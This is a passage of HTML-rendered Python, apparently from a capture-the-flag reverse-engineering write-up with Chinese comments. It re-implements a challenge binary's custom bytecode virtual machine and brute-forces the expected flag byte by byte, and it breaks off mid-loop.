class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从你提供的反汇编直接提取的单字节指令流（每个 db 的第一个字节）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># （如果你的二进制里 code 提取方式不同，按需调整）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line">CODE = [</span><br><span class="line"></span><br><span class="line">  <span class="number">0x34</span>,<span class="number">0x2E</span>,<span class="number">0x2B</span>,<span class="number">0x2E</span>,<span class="number">0x19</span>,<span class="number">0x2C</span>,<span class="number">0x29</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x4E</span>,<span class="number">0x22</span>,<span class="number">0x27</span>,<span class="number">0x2E</span>,<span class="number">0x53</span>,<span class="number">0x2D</span>,<span class="number">0x28</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x23</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x53</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2B</span>,<span class="number">0x2E</span>,<span class="number">0x43</span>,<span class="number">0x2D</span>,<span class="number">0x29</span>,<span class="number">0x26</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x54</span>,<span class="number">0x22</span>,<span class="number">0x27</span>,<span class="number">0x2E</span>,<span class="number">0x46</span>,<span class="number">0x2D</span>,<span class="number">0x28</span>,<span class="number">0x23</span>,<span class="number">0x27</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2B</span>,<span class="number">0x32</span>,<span class="number">0x26</span>,<span class="number">0x2E</span>,<span class="number">0x31</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x2B</span>,<span class="number">0x2E</span>,<span class="number">0x32</span>,<span class="number">0x2C</span>,<span class="number">0x30</span>,<span class="number">0x2D</span>,<span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x04</span>,<span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备注：这个 CODE 列表来源于你贴出的 db 序列（只取每条 db 的首字节，忽略额外填充 0）</span></span><br><span class="line"></span><br><span class="line">CMP_DATA = [</span><br><span class="line"></span><br><span class="line">  <span class="number">0x1A</span>,<span class="number">0x1E</span>,<span class="number">0x1D</span>,<span class="number">0x0E</span>,<span class="number">0x1C</span>,<span class="number">0x13</span>,<span class="number">0x25</span>,<span class="number">0x0E</span>,<span class="number">0x78</span>,<span class="number">0x3B</span>,<span class="number">0x31</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x3F</span>,<span class="number">0x68</span>,<span class="number">0x45</span>,<span class="number">0x23</span>,<span class="number">0x3D</span>,<span class="number">0x0F</span>,<span class="number">0x45</span>,<span class="number">0x37</span>,<span class="number">0x3A</span>,<span class="number">0x3A</span>,<span class="number">0x70</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x07</span>,<span class="number">0x81</span>,<span class="number">0x1A</span>,<span class="number">0x2A</span>,<span class="number">0x3D</span>,<span class="number">0x7E</span>,<span class="number">0x7D</span>,<span class="number">0x3C</span>,<span class="number">0x09</span>,<span class="number">0x82</span>,<span class="number">0x39</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x2A</span>,<span class="number">0x0E</span>,<span class="number">0x7E</span>,<span class="number">0x09</span>,<span class="number">0x32</span>,<span class="number">0x19</span>,<span class="number">0x81</span>,<span class="number">0x0C</span>,<span class="number">0x2A</span>,<span class="number">0x68</span>,<span class="number">0x45</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x09</span>,<span class="number">0x43</span>,<span class="number">0x3B</span>,<span class="number">0x70</span>,<span class="number">0x4F</span>,<span class="number">0x4C</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里 CMP_DATA 含 48 个有效字节（与你提供的数据一致）。若真实二进制更长可补齐。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># VM 实现（忠实于你反汇编的 exec）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VM</span>:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, code: <span class="type">List</span>[<span class="built_in">int</span>], cmp_data: <span class="type">List</span>[<span class="built_in">int</span>], mem: <span class="built_in">bytes</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.code = code[:]    <span class="comment"># 指令流（每项 0..255）</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.cmp_data = cmp_data[:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 模拟 a2 的结构：</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.acc = <span class="number">0</span>      <span class="comment"># a2[0]</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.idx = <span class="number">0</span>      <span class="comment"># a2[1] (byte)</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.pc = <span class="number">0</span>      <span class="comment"># *((int*)a2 + 2)</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.sp = <span class="number">0</span>      <span class="comment"># stack pointer</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.reg3 = <span class="number">0</span>     <span class="comment"># a2[3]</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.counter = <span class="number">0</span>    <span class="comment"># *((int*)a2 + 4)</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.errflag = <span class="number">0</span>    <span class="comment"># a2[4]</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.stack = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mem（输入），保证至少 0x40 长</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(mem) &lt; <span class="number">0x40</span>:</span><br><span class="line">    </span><br><span class="line">      mem = mem + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x40</span> - <span class="built_in">len</span>(mem))</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.mem = <span class="built_in">list</span>(mem)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># byte2（a2[2] 当作小量）确保存在</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.byte2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">current_op</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= <span class="variable language_">self</span>.pc &lt; <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">step</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行当前 pc 指令并推进。返回 (halted:bool, message:str|None).&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.pc &lt; <span class="number">0</span> <span class="keyword">or</span> <span class="variable language_">self</span>.pc &gt;= <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">f&quot;PC out of range <span class="subst">&#123;self.pc&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    v9 = <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 以下行为对应你反汇编中的分支</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">34</span>: <span class="comment"># add reg3</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc + (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">35</span>: <span class="comment"># sub</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc - (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">36</span>: <span class="comment"># mul</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc * (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">37</span>: <span class="comment"># div</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.reg3 == <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Error: Division by zero&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="built_in">int</span>(<span class="variable language_">self</span>.acc // <span class="variable language_">self</span>.reg3)</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">38</span>: <span class="comment"># xor</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc ^ (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">39</span>: <span class="comment"># push</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.sp &gt;= <span class="number">500</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Error: Stack overflow&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.stack.append(<span class="variable language_">self</span>.acc &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.sp += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">40</span>: <span class="comment"># pop</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.sp &lt;= <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Error: Stack underflow&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.sp -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.stack.pop() &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">41</span>: <span class="comment"># load mem[idx] -&gt; acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.idx &gt;= <span class="number">0x33</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.acc = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= <span class="variable language_">self</span>.idx &lt; <span class="built_in">len</span>(<span class="variable language_">self</span>.mem):</span><br><span class="line">    </span><br><span class="line">          <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.mem[<span class="variable language_">self</span>.idx]</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">          <span class="variable language_">self</span>.acc = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">42</span>: <span class="comment"># acc = reg3</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">43</span>: <span class="comment"># idx = acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.idx = <span class="variable language_">self</span>.acc &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">44</span>: <span class="comment"># a2[2] = acc (we map to byte2)</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.byte2 = <span class="variable language_">self</span>.acc &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">45</span>: <span class="comment"># reg3 = acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.reg3 = <span class="variable language_">self</span>.acc &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">46</span>: <span class="comment"># acc = code[pc+1]; pc += 2</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.pc + <span class="number">1</span> &gt;= <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Immediate out of range&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc + <span class="number">1</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">47</span>: <span class="comment"># acc = idx</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.idx &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">48</span>: <span class="comment"># load cmp_data[idx] -&gt; acc (guard idx)</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.idx &gt;= <span class="number">0x32</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.errflag = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;HALT_IDX_GE_0x32&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="number">0</span> &lt;= <span class="variable language_">self</span>.idx &lt; <span class="built_in">len</span>(<span class="variable language_">self</span>.cmp_data):</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.cmp_data[<span class="variable language_">self</span>.idx] &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.acc = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">49</span>: <span class="comment"># ++acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">50</span>: <span class="comment"># loop: --byte2; if byte2 !=0 pc = pc - code[pc+1]; else pc+=2</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.byte2 = (<span class="variable language_">self</span>.byte2 - <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.byte2 != <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.pc + <span class="number">1</span> &gt;= <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Immediate out of range for opcode 50&quot;</span></span><br><span class="line">    </span><br><span class="line">        imm = <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc + <span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.pc = <span class="built_in">int</span>(<span class="variable language_">self</span>.pc - imm)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.pc += <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">51</span>: <span class="comment"># ++counter; if idx &gt;=0x32 -&gt; err; if !err &amp;&amp; acc!=reg3 err=1; idx--; pc++</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.counter += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.idx &gt;= <span class="number">0x32</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.errflag = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;HALT_IDX_GE_0x32_on_51&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">not</span> <span class="variable language_">self</span>.errflag) <span class="keyword">and</span> ((<span class="variable language_">self</span>.acc &amp; <span class="number">0xFFFFFFFF</span>) != (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)):</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.errflag = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="comment"># decrement idx</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.idx = (<span class="variable language_">self</span>.idx - <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">52</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">255</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.errflag <span class="keyword">or</span> (<span class="variable language_">self</span>.counter != <span class="number">50</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Result: check failed (errflag or counter != 50)&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;oh!You are right!&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">f&quot;Unknown opcode: <span class="subst">&#123;v9&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解器：从 idx = 49 到 0 逐位枚举</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原理：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对每个目标索引 pos（49,48,...,0）：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  枚举 val=0..255，在一个 mem（长度至少 50）中把 mem[pos]=val，已知的 suffix (pos+1..49) 用上一步求得的字节填入，</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  其余字节置 0；执行 VM，监控每次遇到 opcode 51（比较）时的当前 vm.idx（比较发生时使用当前 idx 值），</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  当遇到 vm.idx == pos 的那次 51，就取当时的 vm.acc 和 vm.reg3（我们在执行该 51 前就可以读取），</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  如果 acc == reg3 那么这个 val 合格（接受）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 该方法基于反汇编中比较是从高 idx 向低 idx 进行的（观察到的行为）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line"></span><br><span class="line">  N = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">  found = [<span class="number">0</span>] * N <span class="comment"># 存放已恢复的字节；我们从高位向低位填充（49 -&gt; 0）</span></span><br><span class="line"></span><br><span class="line">  start_time = time.time()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>): <span class="comment"># 49,48,...,0</span></span><br><span class="line"></span><br><span class="line">    ok = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 求解 pos=<span class="subst">&#123;pos&#125;</span> ...&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 构造 mem：所有字节默认 0；已知 suffix 填入；pos 处试 val</span></span><br><span class="line">    </span><br><span class="line">      mem = <span class="built_in">bytearray</span>(N)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pos+<span class="number">1</span>, N):</span><br><span class="line">    </span><br><span class="line">        mem[j] = found[j]</span><br><span class="line">    </span><br><span class="line">      mem[pos] = val</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># run VM but we need to detect the 51 event for idx == pos</span></span><br><span class="line">    </span><br><span class="line">      vm = VM(code=CODE, cmp_data=CMP_DATA, mem=<span class="built_in">bytes</span>(mem))</span><br><span class="line">    </span><br><span class="line">      steps = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      hit = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">      failure = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">        op = vm.current_op()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> op <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">          failure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># If upcoming instruction is 51 and vm.idx == pos, check acc vs reg3 BEFORE executing step</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">51</span> <span class="keyword">and</span> vm.idx == pos:</span><br><span class="line">    </span><br><span class="line">          <span class="comment"># inspect acc &amp; reg3</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> (vm.acc &amp; <span class="number">0xFFFFFFFF</span>) == (vm.reg3 &amp; <span class="number">0xFFFFFFFF</span>):</span><br><span class="line">    </span><br><span class="line">            hit = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="comment"># execute the 51 step to keep VM consistent (not strictly necessary here)</span></span><br><span class="line">    </span><br><span class="line">          halted, msg = vm.step()</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> halted:</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># if halted but it was a normal termination, still we can accept based on hit</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span> <span class="comment"># for this candidate we&#x27;ve evaluated the relevant comparison</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># otherwise just step normally until we either hit the event or VM halts or we step too many</span></span><br><span class="line">    </span><br><span class="line">        halted, msg = vm.step()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> halted:</span><br><span class="line">    </span><br><span class="line">          failure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        steps += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> steps &gt; <span class="number">200000</span>:</span><br><span class="line">    </span><br><span class="line">          failure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> hit <span class="keyword">and</span> <span class="keyword">not</span> failure:</span><br><span class="line">    </span><br><span class="line">        found[pos] = val</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  -&gt; 找到 byte @ <span class="subst">&#123;pos&#125;</span> = 0x<span class="subst">&#123;val:02x&#125;</span> (&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(val) <span class="keyword">if</span> <span class="number">32</span>&lt;=val&lt;<span class="number">127</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span>&#125;</span>&#x27;)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">        ok = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span 